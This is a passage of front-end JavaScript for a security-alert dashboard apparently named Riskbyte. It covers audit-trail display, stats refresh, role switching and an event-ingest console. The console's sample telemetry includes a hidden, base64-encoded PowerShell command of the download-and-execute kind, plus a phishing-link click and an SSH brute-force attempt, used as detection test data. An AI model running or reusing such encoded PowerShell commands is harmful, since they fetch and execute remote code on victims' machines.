                var prevStr = entry ? (entry.prev_hash || "0000000000000000000000") : "0000000000000000000000";
                var auditHtml = "SHA-256 Ledger Block: <code>" + hashStr.substring(0, 24) + "...</code><br>" +
                  "Previous Hash: <code>" + prevStr.substring(0, 16) + "...</code> &bull; " +
                  "Actor: <code>" + (entry ? entry.actor : "analyst:muhammad.nabil") + "</code> &bull; " +
                  "Client: <code>" + (entry && entry.client ? entry.client : org.name) + "</code> &bull; " +
                  "<span style='color:var(--accent-green);font-weight:600;'>Chain Intact ✓</span>";
                addStep(7, "7. Cryptographic Audit Trail Record", auditHtml, sc.steps.s7.means, sc.steps.s7.impact, true);

                if (whatBox && whatText) {
                  whatText.textContent = sc.what_happened;
                  whatBox.style.display = "block";
                }

                if (statusPill) {
                  statusPill.className = "status-badge approved";
                  statusPill.textContent = "Contained & Resolved (" + org.name + ")";
                }

                refresh();
              })
              .catch(function (err) {
                appBtn.textContent = "Approval Failed: " + (err ? err.message : "Error");
              });
          });
        })
        .catch(function (err) {
          if (statusPill) {
            statusPill.className = "status-badge auto_closed";
            statusPill.textContent = "Simulation Failed: " + (err ? err.message : "Error");
          }
        });
    }, 400);
  }

  /* ── Refresh Dashboard Data ──────────────────────────── */
  function refresh() {
    api("/api/alerts").then(renderList).catch(function (err) {
      if (err && err.message && err.message.indexOf("Authentication") !== -1) signOut();
    });

    api("/api/license").then(function (l) {
      var licEl = $("lic");
      if (licEl) {
        licEl.textContent = (l.state || "dev").toUpperCase() +
          (l.plan ? " · " + l.plan : "") +
          (l.days_left != null ? " · " + l.days_left + "d" : "");
      }
      var b = $("banner");
      if (b) {
        if (l.state === "active" || l.state === "dev") {
          b.style.display = "none";
        } else {
          b.style.display = "flex";
          b.textContent = l.message || "";
        }
      }
      var planEl = $("lic-card-plan");
      if (planEl) planEl.textContent = l.plan || "Development License";
      var stateEl = $("lic-card-state");
      if (stateEl) stateEl.textContent = "State: " + (l.state || "active").toUpperCase();
      var endpEl = $("lic-card-endpoints");
      if (endpEl) endpEl.textContent = l.endpoints ? l.endpoints + " Hosts" : "Unlimited";
    }).catch(function () {});

    api("/api/stats").then(function (s) {
      var intactText = s.audit_intact ? "Audit: Intact ✓" : "Audit: TAMPERED ⚠";
      var statsEl = $("stats");
      if (statsEl) statsEl.textContent = s.events + " events · " + s.open_alerts + " open · " + intactText;

      var auditBadge = $("audit-integrity-badge");
      if (auditBadge) {
        auditBadge.className = "audit-badge " + (s.audit_intact ? "intact" : "tampered");
        var span = auditBadge.querySelector("span");
        if (span) span.textContent = s.audit_intact ? "Hash Chain: Intact (SHA-256)" : "Hash Chain: TAMPERED";
      }

      var aEvents = $("admin-stat-events");
      if (aEvents) aEvents.textContent = String(s.events);
      var aCases = $("admin-stat-cases");
      if (aCases) aCases.textContent = String(s.open_cases);
      var aLlm = $("admin-stat-llm");
      if (aLlm) aLlm.textContent = (s.llm && s.llm !== "none") ? s.llm.toUpperCase() : "HEURISTIC";
      var aRedact = $("admin-stat-redaction");
      if (aRedact) aRedact.textContent = s.llm_redaction ? "Entity Redaction Active (Privacy Safe)" : "Direct Local Processing";
      var aAudit = $("admin-stat-audit");
      if (aAudit) {
        aAudit.textContent = s.audit_intact ? "Intact ✓" : "TAMPERED ⚠";
        aAudit.style.color = s.audit_intact ? "var(--accent-green)" : "var(--accent-red)";
      }
      var iTotal = $("ingest-stat-total");
      if (iTotal) iTotal.textContent = String(s.events);
    }).catch(function () {});

    api("/api/cases").then(function (c) {
      table("ct", ["Case ID", "Client Organization", "Target Entity", "Severity", "Status", "Opened Time"], c.map(function (x) {
        return ["#" + x.id, x.client || "Meezan Bank", x.entity, x.severity.toUpperCase(), x.status, when(x.ts)];
      }));
    }).catch(function () {});

    api("/api/audit").then(function (a) {
      table("at", ["Timestamp", "Client Organization", "Actor / Role", "Audit Event", "Target Alert", "Operation Detail"], a.map(function (x) {
        return [when(x.ts), x.client || "General", x.actor, x.kind, x.alert_id == null ? "–" : "#" + x.alert_id, x.detail];
      }));
    }).catch(function () {});
  }

  /* ── Unified Tab Switching Helper ─────────────────────── */
  function switchTab(targetTab) {
    haptic(HAPTIC.light);
    document.querySelectorAll(".tabs-group button").forEach(function (btn) {
      btn.classList.toggle("on", btn.dataset.t === targetTab);
    });

    var allViews = ["alerts", "cases", "demo", "admin-overview", "audit", "admin-license", "ingest-monitor", "ingest-stream", "ingest-console"];
    allViews.forEach(function (n) {
      var v = $("v-" + n);
      if (v) v.style.display = (n === targetTab) ? "" : "none";
    });

    if (targetTab === "demo") {
      var offlineBanner = $("demo-offline-banner");
      if (offlineBanner) offlineBanner.style.display = (serverMode === "sim") ? "flex" : "none";
      var clientSelect = $("demo-client-select");
      var selId = (clientSelect && clientSelect.value) ? clientSelect.value : "meezan";
      renderClientProfile(selId);
      renderDemoCards(selId);
    } else if (targetTab === "ingest-stream") {
      loadEventsStream();
    }
  }

  /* ── DOM Ready: Wire Up Events ───────────────────────── */

  // Initialize server mode toggle UI
  updateServerModeUI();

  var serverTogglePill = $("server-toggle");
  if (serverTogglePill) serverTogglePill.addEventListener("click", toggleServerMode);

  var authServerToggleBtn = $("auth-server-toggle-btn");
  if (authServerToggleBtn) authServerToggleBtn.addEventListener("click", toggleServerMode);

  // Role button in header: click to cycle roles easily
  var roleBadge = $("role-badge");
  if (roleBadge) {
    roleBadge.addEventListener("click", function () {
      haptic(HAPTIC.medium);
      var roles = ["analyst", "admin", "ingest"];
      var nextIdx = (roles.indexOf(currentRole) + 1) % roles.length;
      var nextRole = roles[nextIdx];
      if (token === "dev-analyst" || token === "dev-admin" || token === "dev-ingest") {
        token = "dev-" + nextRole;
        sessionStorage.setItem("rb_token", token);
      }
      setRole(nextRole);
      updateDynamicIsland("Riskbyte", "Switched to " + (nextRole === "admin" ? "Admin" : (nextRole === "ingest" ? "Ingest" : "Analyst")), false);
      refresh();
    });
  }

  // Start in signed-out state
  applyAuthState(false);

  // Role buttons on login screen
  document.querySelectorAll(".auth-role-btn").forEach(function (btn) {
    btn.addEventListener("click", function () {
      var tok = btn.getAttribute("data-token");
      performLogin(tok, btn);
    });
  });

  // Sign out button
  var outBtn = $("out");
  if (outBtn) outBtn.addEventListener("click", signOut);

  // Wire Tab button clicks
  document.querySelectorAll(".tabs-group button").forEach(function (b) {
    b.addEventListener("click", function () {
      if (b.dataset.t) switchTab(b.dataset.t);
    });
  });

  // Reset Demo button
  var demoResetBtn = $("demo-reset-btn");
  if (demoResetBtn) {
    demoResetBtn.addEventListener("click", function () {
      haptic(HAPTIC.medium);
      demoResetBtn.disabled = true;
      demoResetBtn.textContent = "Resetting...";
      api("/api/demo/reset", "POST")
        .then(function () {
          demoResetBtn.disabled = false;
          demoResetBtn.innerHTML = "<svg style='width:14px;height:14px;' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2.5'><polyline points='1 4 1 10 7 10'></polyline><path d='M3.51 15a9 9 0 1 0 2.13-9.36L1 10'></path></svg> <span>Reset Demo Data</span>";
          var panel = $("demo-live-panel");
          if (panel) panel.style.display = "none";
          cur = null;
          updateDynamicIsland("Riskbyte", "Demo Data Cleared", false);
          haptic(HAPTIC.success);
          refresh();
        })
        .catch(function () {
          demoResetBtn.disabled = false;
          demoResetBtn.textContent = "Reset Demo Data";
        });
    });
  }

  // Wire Client Selector and initial render for Demo tab
  var clientSelect = $("demo-client-select");
  if (clientSelect) {
    clientSelect.addEventListener("change", function () {
      haptic(HAPTIC.light);
      var selId = clientSelect.value || "meezan";
      renderClientProfile(selId);
      renderDemoCards(selId);
      var panel = $("demo-live-panel");
      if (panel) panel.style.display = "none";
    });
  }

  // Initial render of client profile & cards
  renderClientProfile("meezan");
  renderDemoCards("meezan");

  // Direct Ingest Console Presets & Dispatcher
  var pSyslog = $("preset-syslog-btn");
  if (pSyslog) {
    pSyslog.addEventListener("click", function () {
      var txt = $("ingest-payload-text");
      if (txt) {
        txt.value = JSON.stringify({
          events: [{
            ts: Math.floor(Date.now() / 1000),
            host: "web-01",
            process: "sshd",
            action: "login",
            outcome: "failure",
            user: "root",
            src_ip: "1.2.3.4",
            message: "Failed password for root"
          }]
        }, null, 2);
      }
    });
  }

  var pPs = $("preset-powershell-btn");
  if (pPs) {
    pPs.addEventListener("click", function () {
      var txt = $("ingest-payload-text");
      if (txt) {
        txt.value = JSON.stringify({
          events: [{
            ts: Math.floor(Date.now() / 1000),
            host: "fin-lt-042",
            user: "m.silva",
            process: "powershell.exe",
            cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo...",
            action: "process_start",
            outcome: "success"
          }]
        }, null, 2);
      }
    });
  }

  var pPhish = $("preset-phish-btn");
  if (pPhish) {
    pPhish.addEventListener("click", function () {
      var txt = $("ingest-payload-text");
      if (txt) {
        txt.value = JSON.stringify({
          events: [{
            ts: Math.floor(Date.now() / 1000),
            host: "corp-mail-gw",
            user: "j.doe",
            process: "outlook.exe",
            action: "email_link_click",
            src_ip: "203.0.113.50",
            message: "User clicked inbound link to http://login-verify-account.com/login"
          }]
        }, null, 2);
      }
    });
  }

  var dispatchBtn = $("dispatch-event-btn");
  if (dispatchBtn) {
    dispatchBtn.addEventListener("click", function () {
      var txt = $("ingest-payload-text");
      var statusLbl = $("dispatch-status-label");
      if (!txt || !txt.value.trim()) return;
      try {
        var body = JSON.parse(txt.value);
        dispatchBtn.disabled = true;
        dispatchBtn.textContent = "Dispatching...";
        api("/api/ingest", "POST", body)
          .then(function (res) {
            dispatchBtn.disabled = false;
            dispatchBtn.innerHTML = "<svg style='width:14px;height:14px;' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2.5'><polyline points='22 2 9.2 14.8 4 10'></polyline></svg> <span>Dispatch Telemetry Batch</span>";
            if (statusLbl) {
              statusLbl.style.color = "var(--accent-green)";
              statusLbl.textContent = "Accepted " + (res.accepted || 1) + " event(s) successfully ✓";
            }
            haptic(HAPTIC.success);
            refresh();
          })
          .catch(function (err) {
            dispatchBtn.disabled = false;
            dispatchBtn.innerHTML = "<svg style='width:14px;height:14px;' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2.5'><polyline points='22 2 9.2 14.8 4 10'></polyline></svg> <span>Dispatch Telemetry Batch</span>";
            if (statusLbl) {
              statusLbl.style.color = "var(--accent-red)";
              statusLbl.textContent = "Dispatch failed: " + (err ? err.message : "Error");
            }
          });
      } catch (e) {
        if (statusLbl) {
          statusLbl.style.color = "var(--accent-red)";
          statusLbl.textContent = "Invalid JSON syntax.";
        }
      }
    });
  }

  // Auto-login if token already in sessionStorage
  if (token) {
    api("/api/stats")
      .then(function () { start(); })
      .catch(function () {
        sessionStorage.removeItem("rb_token");
        token = "";
        applyAuthState(false);
      });
  }
})();
